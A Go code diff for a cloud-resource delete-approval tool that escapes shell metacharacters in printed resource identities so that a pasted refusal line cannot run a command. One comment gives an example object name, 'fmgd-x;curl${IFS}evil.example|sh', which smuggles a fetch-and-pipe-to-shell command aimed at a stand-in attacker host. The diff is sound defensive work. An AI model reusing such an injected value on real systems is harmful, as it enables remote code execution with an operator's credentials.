@@ -6,6 +6,7 @@ import (
 	"strings"
 
 	"github.com/dimipaun/fugaro/internal/safetext"
+	"github.com/dimipaun/fugaro/internal/shellword"
 )
 
 // An owner's delete list names addresses, and an address is not an object
@@ -75,6 +76,22 @@ import (
 // refused rather than printed in part (RemovalIdentityPrintMax), which is the
 // same fail-closed direction as the rest of the rule: a printed identity that
 // is a prefix of the real one would be an approval of nothing.
+//
+// The same escaping covers the other reader of that text, which is a SHELL: an
+// identity is printed bare — it cannot be quoted, since what a refusal prints
+// is what the command compares byte for byte — and its parts are read out of
+// the plan's before view, a document someone else's session may have written.
+// The cover's own name rule does not reach every part: for a bucket object it
+// names the bucket and not the object's own name (managedNames), and a plan's
+// id, project and instance value are read as they stand. So an identity may
+// hold a separator, a pipe, a substitution or a glob, and one that printed them
+// raw would be a command line its reader pastes. They are escaped out of it too
+// (identitySafe), so the line holds no byte that can begin, end or continue a
+// command (TestManagedCoverRefusalOfAShellCommandNameIsPasteable is the
+// reachable end of it). The encoding's own space and backslash are not escaped
+// — it writes both itself — and a shell does rewrite those; what that costs a
+// paste, and why the result is refused rather than recorded, is at the
+// escaping's own comment below.
 
 // removalInstanceAttributes is the attribute of each resource type whose
 // before view carries a value the provider mints per INSTANCE of the object
@@ -208,8 +225,10 @@ type RemovalIdentity struct {
 // text compared — and every byte a value holds that a printer of this program
 // would rewrite, drop or cut is escaped too (identityPart), which leaves the
 // identity one line of printable ASCII that safetext.Field and
-// safetext.MultiLine carry unchanged. The one byte that takes more than
-// leaving alone is the space: a value's own space is written as \x20 and never
+// safetext.MultiLine carry unchanged — and, the paste it is printed for being
+// a command line, no byte of it is one a shell reads in a way of its own
+// (identitySafe). The one byte that takes more than leaving alone is the
+// space: a value's own space is written as \x20 and never
 // as the backslash-and-space pair the two-character escapes use, because the
 // space between two parts is the only whitespace an identity may hold and a
 // printer rebuilding the line with strings.Fields (safetext.fieldRewrite)
@@ -256,7 +275,11 @@ func (i RemovalIdentity) String() string {
 // could never close. So every byte a value holds that those transforms would
 // not leave alone is escaped as well: a byte outside printable ASCII becomes
 // \xHH, a space among them, and a parenthesis too (identityValue), because the
-// sentence prints the identity inside a parenthetical of its own. An ordinary
+// sentence prints the identity inside a parenthetical of its own. The reader of
+// that sentence has a shell, and it escapes a byte for that too: what a shell
+// reads in a way of its own — a separator, a pipe, a redirection, a
+// substitution, a quote, a glob, an expansion — is escaped out of the text,
+// which is printed bare and cannot be quoted (identitySafe). An ordinary
 // identity — a type, a project, a DNS-shaped name, a provider id — holds none
 // of them and reads exactly as it always did.
 func identityPart(k, v string) string {
@@ -264,10 +287,10 @@ func identityPart(k, v string) string {
 }
 
 // identityValue is a value as an identity writes it: itself, when every byte
-// of it is one the printers leave alone, and otherwise with a backslash and
-// every byte outside printable ASCII escaped (\xHH, two lowercase hex digits,
-// one escape per byte of a multi-byte character) — a space among them, and
-// NOT as a backslash and a space.
+// of it is one the printers leave alone AND one a shell reads as itself, and
+// otherwise with a backslash and every other byte escaped (\xHH, two lowercase
+// hex digits, one escape per byte of a multi-byte character) — a space among
+// them, and NOT as a backslash and a space.
 //
 // A value's space is escaped as \x20 and never written as `\ `, because the
 // only whitespace an identity may hold is the single space between two of its
@@ -297,15 +320,46 @@ func identityPart(k, v string) string {
 // than recorded (approveArgument) — which is what keeps a paste from being
 // accepted as an entry that matches no removal.
 //
+// A shell metacharacter is escaped (as \xHH) although it has a printable form
+// too, and that is the third thing this escaping is for: the identity is
+// printed for its reader to PASTE, and the sentence around it is read by
+// whoever is approving the delete. Its parts are the plan's own — a document
+// someone else's session may have written, and one the cover's name rule does
+// not read whole (it checks a bucket object's bucket and not the object's own
+// name) — so an object named "fmgd-x;curl${IFS}evil.example|sh" reaches a
+// refusal with those bytes in its name. An identity that printed them raw
+// would be a command line: its reader pastes it, the shell reads the ";", and
+// the rest of the plan's name runs as a command of its own — with the
+// operator's credentials, which are the ones fugaro allow-delete writes the
+// owner's list with. Quoting is not open to this text (the command compares
+// what it is given byte for byte), so the bytes a shell reads in a way of its
+// own are escaped out of it instead: what shellword.Quote would quote, a value
+// here escapes (identitySafe). What is left of the line is the bytes
+// shellword.SafeByte accepts — the letters, the digits, and the punctuation no
+// shell of the family these commands are pasted into reads in a way of its own
+// — beside the encoding's own two, the single space between two parts and the
+// backslash that introduces an escape; and none of them can begin, end or
+// continue a command, which is what this escaping buys and what the test holds
+// (TestAnIdentityHoldsNoByteAShellWouldRead). A shell does rewrite the
+// encoding's own two, so a paste that does not keep the space and the backslash
+// whole arrives as several arguments and is refused rather than recorded
+// (approveArgument — fail-closed, and never a wrong entry, but not the entry
+// its reader meant either). An ordinary identity — a type, a project, a
+// DNS-shaped name, a provider id — holds none of them and reads exactly as it
+// always did; the only identities whose printed text this changes are the ones
+// a plan carried a metacharacter in, and for those an entry recorded from an
+// earlier refusal
+// holds the older spelling and approves nothing — the removal is refused again,
+// with the text to copy, which is the fail-closed direction the rest of this
+// rule takes.
+//
 // The result is one line of printable ASCII with no byte safetext.Field,
-// safetext.MultiLine or a terminal has anything to say about, so what is
-// printed is what an entry holds — and the escaping stays injective: a
+// safetext.MultiLine, a terminal or a shell has anything to say about, so what
+// is printed is what an entry holds — and the escaping stays injective: a
 // backslash in the value is doubled, a space is written as \x20, and a literal
 // "\x41" in a value writes "\\x41", so no two values escape to one text.
 func identityValue(v string) string {
-	if !strings.ContainsFunc(v, func(r rune) bool {
-		return r == '\\' || r == '(' || r == ')' || r < 0x21 || r > 0x7e
-	}) {
+	if !strings.ContainsFunc(v, func(r rune) bool { return !identitySafe(r) }) {
 		return v
 	}
 	const hex = "0123456789abcdef"
@@ -315,7 +369,7 @@ func identityValue(v string) string {
 		switch c := v[i]; {
 		case c == '\\':
 			b.WriteString(`\\`)
-		case c == '(' || c == ')' || c < 0x21 || c > 0x7e:
+		case !identitySafe(rune(c)):
 			b.WriteString(`\x`)
 			b.WriteByte(hex[c>>4])
 			b.WriteByte(hex[c&0xf])
@@ -324,6 +378,17 @@ func identityValue(v string) string {
 		}
 	}
 	return b.String()
+}
+
+// identitySafe is a byte identityValue may write as itself: one a shell reads
+// as itself (shellword.SafeByte) and one every printer of this program leaves
+// alone. The two rules are one set here — every byte shellword.SafeByte accepts
+// is printable ASCII and none of them is a backslash, which is the byte the
+// escaping itself uses — and the range is written beside it rather than left to
+// the shell's set, because the printers' own rule is this package's: a byte
+// outside printable ASCII is escaped whatever a shell would make of it.
+func identitySafe(r rune) bool {
+	return r >= 0x21 && r <= 0x7e && shellword.SafeByte(byte(r))
 }
 
 // RemovalIdentityPrintMax is the longest identity this program prints, and
@@ -556,8 +621,13 @@ func identityText(id RemovalIdentity) string {
 // and without marks of the sentence's own: the owner pastes it, and a
 // surrounding pair of quotes would be characters the identity does not have
 // (the command strips one matched pair if a caller pastes them anyway, so the
-// two agree about what is printed here). A value the identity holds that
-// carries a space, a backslash or any byte with no printable form is printed
+// two agree about what is printed here). Printed bare is safe because the text
+// holds no byte a shell reads in a way of its own (identitySafe): what a plan's
+// name carries — a separator, a pipe, a substitution, a glob — is escaped out
+// of it, so a reader who pastes it into a shell without quoting it runs fugaro
+// allow-delete with this identity and no other command. A value the identity
+// holds that carries a space, a backslash, a shell metacharacter or any byte
+// with no printable form is printed
 // escaped, exactly as the entry holds it (identityPart), and the whole
 // identity is printed through safetext.FieldUncut rather than Field — one
 // line of printable ASCII, uncut — so the text a refusal prints is the text an
